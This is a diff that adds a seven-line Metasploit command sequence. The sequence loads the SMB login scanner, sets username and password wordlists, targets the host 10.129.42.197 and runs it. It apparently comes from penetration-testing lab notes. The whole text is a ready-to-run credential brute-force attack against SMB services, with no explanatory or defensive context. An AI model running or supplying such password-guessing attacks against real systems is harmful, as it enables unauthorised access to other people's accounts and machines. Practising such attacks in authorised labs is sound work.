@@ -1,0 +1,7 @@
+msfconsole -q
+use auxiliary/scanner/smb/smb_login
+options
+set user_file user.list
+set pass_file password.list
+set rhosts 10.129.42.197
+run
